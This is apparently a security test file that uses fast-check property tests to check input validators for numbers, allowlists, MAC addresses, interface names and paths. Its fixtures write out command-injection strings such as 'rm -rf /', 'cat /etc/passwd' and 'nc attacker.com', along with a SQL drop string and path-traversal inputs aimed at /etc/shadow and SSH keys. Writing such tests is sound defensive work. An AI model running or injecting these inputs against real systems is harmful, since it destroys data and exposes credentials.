/**
 * Property-Based Testing for Input Validators - Phase 2.2.6
 *
 * Uses fast-check to generate thousands of random inputs per test,
 * verifying that validators handle ALL inputs correctly, not just hand-crafted cases.
 *
 * Why property-based testing matters for security:
 * - Catches edge cases that hand-crafted tests miss (Unicode, control chars, etc.)
 * - Verifies invariants hold for ALL inputs (not just anticipated attack patterns)
 * - Tests regex catastrophic backtracking with long strings
 * - Validates numeric edge cases (NaN, Infinity, -0, MAX_SAFE_INTEGER+1)
 *
 * Standards: NIST SP 800-53 SI-10 (Input Validation), CWE-20 (Improper Input Validation),
 *            OWASP A03:2021 (Injection), CERT MSC17-C (Complete Input Validation)
 */

import fc from 'fast-check';
import { describe, expect,test } from 'vitest';

import {
	InputValidationError,
	validateAllowlist,
	validateInterfaceName,
	validateMacAddress,
	validateNumericParam,
	validatePathWithinDir} from '$lib/server/security/input-sanitizer';

describe('Input Validators (Property-Based)', () => {
	describe('validateNumericParam', () => {
		test('accepts all finite numbers within range', () => {
			fc.assert(
				fc.property(
					fc.double({ min: 0, max: 100, noNaN: true, noDefaultInfinity: true }),
					(n) => {
						const result = validateNumericParam(n, 'test', 0, 100);
						expect(result).toBe(n);
						expect(Number.isFinite(result)).toBe(true);
					}
				),
				{ numRuns: 1000 }
			);
		});

		test('rejects all non-numeric strings', () => {
			fc.assert(
				fc.property(
					// Only generate strings that Number() can't parse (NaN)
					// Exclude empty/whitespace strings since Number("") = 0 which is valid
					fc.string().filter((s) => isNaN(Number(s))),
					(s) => {
						expect(() => validateNumericParam(s, 'test', 0, 100)).toThrow(
							InputValidationError
						);
					}
				),
				{ numRuns: 500 }
			);
		});

		test('rejects all numbers below minimum', () => {
			fc.assert(
				fc.property(
					fc.double({ min: -1e10, max: -0.001, noNaN: true, noDefaultInfinity: true }),
					(n) => {
						expect(() => validateNumericParam(n, 'test', 0, 100)).toThrow(
							InputValidationError
						);
					}
				),
				{ numRuns: 500 }
			);
		});

		test('rejects all numbers above maximum', () => {
			fc.assert(
				fc.property(
					fc.double({ min: 100.001, max: 1e10, noNaN: true, noDefaultInfinity: true }),
					(n) => {
						expect(() => validateNumericParam(n, 'test', 0, 100)).toThrow(
							InputValidationError
						);
					}
				),
				{ numRuns: 500 }
			);
		});

		test('rejects NaN, Infinity, and -Infinity', () => {
			const badValues = [NaN, Infinity, -Infinity];
			badValues.forEach((val) => {
				expect(() => validateNumericParam(val, 'test', 0, 100)).toThrow(
					InputValidationError
				);
			});
		});

		test('handles boundary values correctly', () => {
			// Exactly at min and max should pass
			expect(validateNumericParam(0, 'test', 0, 100)).toBe(0);
			expect(validateNumericParam(100, 'test', 0, 100)).toBe(100);

			// Just outside should fail
			expect(() => validateNumericParam(-0.000001, 'test', 0, 100)).toThrow();
			expect(() => validateNumericParam(100.000001, 'test', 0, 100)).toThrow();
		});

		test('handles negative ranges correctly', () => {
			fc.assert(
				fc.property(
					fc.double({ min: -100, max: -10, noNaN: true, noDefaultInfinity: true }),
					(n) => {
						const result = validateNumericParam(n, 'test', -100, -10);
						expect(result).toBe(n);
						expect(result).toBeGreaterThanOrEqual(-100);
						expect(result).toBeLessThanOrEqual(-10);
					}
				),
				{ numRuns: 500 }
			);
		});
	});

	describe('validateAllowlist', () => {
		const allowlist = ['start', 'stop', 'status'] as const;

		test('accepts all values in allowlist', () => {
			allowlist.forEach((value) => {
				const result = validateAllowlist(value, 'action', allowlist);
				expect(result).toBe(value);
			});
		});

		test('rejects all strings not in allowlist', () => {
			fc.assert(
				fc.property(
					fc.string().filter((s) => !allowlist.includes(s as never)),
					(s) => {
						expect(() => validateAllowlist(s, 'action', allowlist)).toThrow(
							InputValidationError
						);
					}
				),
				{ numRuns: 500 }
			);
		});

		test('is case-sensitive', () => {
			expect(() => validateAllowlist('START', 'action', allowlist)).toThrow();
			expect(() => validateAllowlist('Start', 'action', allowlist)).toThrow();
		});

		test('rejects non-string types', () => {
			const badTypes = [123, true, null, undefined, {}, []];
			badTypes.forEach((val) => {
				expect(() => validateAllowlist(val, 'action', allowlist)).toThrow(
					InputValidationError
				);
			});
		});
	});

	describe('validateMacAddress', () => {
		test('accepts valid MAC address formats', () => {
			// Generate valid MAC addresses: XX:XX:XX:XX:XX:XX
			const hexByte = fc
				.integer({ min: 0, max: 255 })
				.map((n) => n.toString(16).padStart(2, '0').toUpperCase());

			fc.assert(
				fc.property(
					fc.tuple(hexByte, hexByte, hexByte, hexByte, hexByte, hexByte),
					([a, b, c, d, e, f]) => {
						const mac = `${a}:${b}:${c}:${d}:${e}:${f}`;
						const result = validateMacAddress(mac);
						expect(result).toBe(mac);
						expect(result).toMatch(/^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/);
					}
				),
				{ numRuns: 500 }
			);
		});

		test('rejects strings with shell metacharacters', () => {
			const shellMetachars = [';', '&', '|', '`', '$', '(', ')', '{', '}', '<', '>', '\n'];

			fc.assert(
				fc.property(
					fc.string().filter((s) => shellMetachars.some((char) => s.includes(char))),
					(s) => {
						expect(() => validateMacAddress(s)).toThrow(InputValidationError);
					}
				),
				{ numRuns: 500 }
			);
		});

		test('rejects invalid MAC formats', () => {
			const invalidMacs = [
				'',
				'AA:BB:CC:DD:EE', // Too short
				'AA:BB:CC:DD:EE:FF:GG', // Too long
				'AA-BB-CC-DD-EE-FF', // Wrong delimiter
				'AABBCCDDEEFF', // No delimiter
				'ZZ:ZZ:ZZ:ZZ:ZZ:ZZ', // Invalid hex
				'AA:BB:CC:DD:EE:FG', // Invalid hex character
				'aa:bb:cc:dd:ee:ff;rm -rf /', // Injection attempt
				"AA:BB:CC:DD:EE:FF'; DROP TABLE --" // SQL injection attempt
			];

			invalidMacs.forEach((mac) => {
				expect(() => validateMacAddress(mac)).toThrow(InputValidationError);
			});
		});

		test('accepts both uppercase and lowercase hex', () => {
			expect(validateMacAddress('AA:BB:CC:DD:EE:FF')).toBe('AA:BB:CC:DD:EE:FF');
			expect(validateMacAddress('aa:bb:cc:dd:ee:ff')).toBe('aa:bb:cc:dd:ee:ff');
			expect(validateMacAddress('Aa:Bb:Cc:Dd:Ee:Ff')).toBe('Aa:Bb:Cc:Dd:Ee:Ff');
		});
	});

	describe('validateInterfaceName', () => {
		test('accepts valid interface names', () => {
			const validNames = [
				'eth0',
				'wlan0',
				'mon0',
				'wlx0013ef',
				'enp0s3',
				'wlan-mon',
				'wifi_5ghz',
				'br0',
				'tun0',
				'lo'
			];

			validNames.forEach((name) => {
				const result = validateInterfaceName(name);
				expect(result).toBe(name);
				expect(result).toMatch(/^[a-zA-Z0-9_-]{1,15}$/);
			});
		});

		test('rejects names with path traversal attempts', () => {
			fc.assert(
				fc.property(
					fc.string().filter((s) => s.includes('..') || s.includes('/')),
					(s) => {
						expect(() => validateInterfaceName(s)).toThrow(InputValidationError);
					}
				),
				{ numRuns: 500 }
			);
		});

		test('rejects names exceeding IFNAMSIZ (15 chars)', () => {
			fc.assert(
				fc.property(fc.string({ minLength: 16, maxLength: 100 }), (s) => {
					expect(() => validateInterfaceName(s)).toThrow(InputValidationError);
				}),
				{ numRuns: 200 }
			);
		});

		test('rejects empty string', () => {
			expect(() => validateInterfaceName('')).toThrow(InputValidationError);
		});

		test('rejects names with special characters', () => {
			const badChars = ['@', '#', '$', '%', '^', '&', '*', '(', ')', '+', '=', '[', ']'];

			badChars.forEach((char) => {
				expect(() => validateInterfaceName(`eth${char}0`)).toThrow(InputValidationError);
			});
		});

		test('rejects shell injection attempts', () => {
			const injectionAttempts = [
				'eth0; rm -rf /',
				'wlan0 && cat /etc/passwd',
				'mon0|nc attacker.com',
				'eth0`whoami`',
				'$(reboot)',
				'wlan0\nmalicious'
			];

			injectionAttempts.forEach((attempt) => {
				expect(() => validateInterfaceName(attempt)).toThrow(InputValidationError);
			});
		});

		test('handles boundary length (15 characters)', () => {
			const exactly15 = 'a'.repeat(15);
			expect(validateInterfaceName(exactly15)).toBe(exactly15);

			const over15 = 'a'.repeat(16);
			expect(() => validateInterfaceName(over15)).toThrow();
		});
	});

	describe('validatePathWithinDir', () => {
		const allowedDir = '/var/argos/data';

		test('accepts paths within allowed directory', () => {
			const validPaths = [
				'signals.db',
				'logs/app.log',
				'cache/temp.json',
				'./signals.db',
				'logs/../signals.db' // Resolves to /var/argos/data/signals.db
			];

			validPaths.forEach((path) => {
				const result = validatePathWithinDir(path, allowedDir);
				expect(result).toContain(allowedDir);
			});
		});

		test('rejects path traversal attempts', () => {
			const traversalAttempts = [
				'../../etc/passwd',
				'../../../root/.ssh/id_rsa',
				'logs/../../../etc/shadow',
				'./../../../../../../etc/passwd'
				// Note: '....//....//etc/passwd' is NOT a traversal — '....' is a literal
				// directory name (not '..'), so path.resolve keeps it within allowedDir
			];

			traversalAttempts.forEach((attempt) => {
				expect(() => validatePathWithinDir(attempt, allowedDir)).toThrow(
					InputValidationError
				);
			});
		});

		test('rejects absolute paths outside allowed directory', () => {
			const outsidePaths = [
				'/etc/passwd',
				'/root/.bashrc',
				'/tmp/evil.sh',
				'/var/www/html/index.php'
			];

			outsidePaths.forEach((path) => {
				expect(() => validatePathWithinDir(path, allowedDir)).toThrow(InputValidationError);
			});
		});

		test('rejects null bytes in path', () => {
			expect(() => validatePathWithinDir('signals.db\0malicious', allowedDir)).toThrow(
				InputValidationError
			);
		});

		test('rejects non-string types', () => {
			const badTypes = [123, true, null, undefined, {}, []];
			badTypes.forEach((val) => {
				expect(() => validatePathWithinDir(val as never, allowedDir)).toThrow(
					InputValidationError
				);
			});
		});

		test('handles symbolic link path safely', () => {
			// Path that looks like it might escape via symlink
			const symlinkPath = 'logs/../../etc/passwd';
			expect(() => validatePathWithinDir(symlinkPath, allowedDir)).toThrow(
				InputValidationError
			);
		});
	});

	describe('Security Invariants - All Validators', () => {
		test('Validators never return undefined', () => {
			// Valid inputs should always return a value, never undefined
			expect(validateNumericParam(50, 'test', 0, 100)).not.toBeUndefined();
			expect(validateAllowlist('start', 'action', ['start', 'stop'])).not.toBeUndefined();
			expect(validateMacAddress('AA:BB:CC:DD:EE:FF')).not.toBeUndefined();
			expect(validateInterfaceName('eth0')).not.toBeUndefined();
			expect(validatePathWithinDir('signals.db', '/var/argos/data')).not.toBeUndefined();
		});

		test('Validators never return null', () => {
			// Valid inputs should always return a value, never null
			expect(validateNumericParam(50, 'test', 0, 100)).not.toBeNull();
			expect(validateAllowlist('start', 'action', ['start', 'stop'])).not.toBeNull();
			expect(validateMacAddress('AA:BB:CC:DD:EE:FF')).not.toBeNull();
			expect(validateInterfaceName('eth0')).not.toBeNull();
			expect(validatePathWithinDir('signals.db', '/var/argos/data')).not.toBeNull();
		});

		test('Validators throw InputValidationError on invalid input', () => {
			// All validators should throw InputValidationError specifically
			expect(() => validateNumericParam('invalid', 'test', 0, 100)).toThrow(
				InputValidationError
			);
			expect(() => validateAllowlist('invalid', 'action', ['start', 'stop'])).toThrow(
				InputValidationError
			);
			expect(() => validateMacAddress('invalid')).toThrow(InputValidationError);
			expect(() => validateInterfaceName('invalid/path')).toThrow(InputValidationError);
			expect(() => validatePathWithinDir('../../etc/passwd', '/var/argos/data')).toThrow(
				InputValidationError
			);
		});

		test('Validators never silently coerce invalid input', () => {
			// Validators should THROW on invalid input, not return a default
			expect(() => validateNumericParam('not-a-number', 'test', 0, 100)).toThrow();
			expect(() => validateMacAddress('not-a-mac')).toThrow();
			expect(() => validateInterfaceName('eth0/../etc/passwd')).toThrow();
		});
	});

	describe('Performance - No Catastrophic Backtracking', () => {
		test('MAC address validation handles long strings efficiently', () => {
			const veryLongString = 'A'.repeat(10000);

			const start = Date.now();
			try {
				validateMacAddress(veryLongString);
			} catch (_error) {
				// Expected to throw, just measuring time
			}
			const duration = Date.now() - start;

			// Should complete in < 100ms (no catastrophic backtracking)
			expect(duration).toBeLessThan(100);
		});

		test('Interface name validation handles long strings efficiently', () => {
			const veryLongString = 'a'.repeat(10000);

			const start = Date.now();
			try {
				validateInterfaceName(veryLongString);
			} catch (_error) {
				// Expected to throw
			}
			const duration = Date.now() - start;

			expect(duration).toBeLessThan(100);
		});
	});

	describe('Unicode and Control Characters', () => {
		test('Validators handle Unicode characters safely', () => {
			const unicodeStrings = [
				'日本語',
				'Ελληνικά',
				'العربية',
				'עברית',
				'😀🚀💻',
				'\u0000', // Null byte
				'\u001F', // Control character
				'\uFFFD' // Replacement character
			];

			unicodeStrings.forEach((str) => {
				// Should either validate safely or throw (not crash)
				try {
					validateInterfaceName(str);
				} catch (error) {
					expect(error).toBeInstanceOf(InputValidationError);
				}
			});
		});

		test('Validators reject control characters that could be exploited', () => {
			const controlChars = '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F';

			expect(() => validateInterfaceName(`eth0${controlChars}`)).toThrow();
			expect(() =>
				validatePathWithinDir(`signals${controlChars}.db`, '/var/argos/data')
			).toThrow();
		});
	});
});
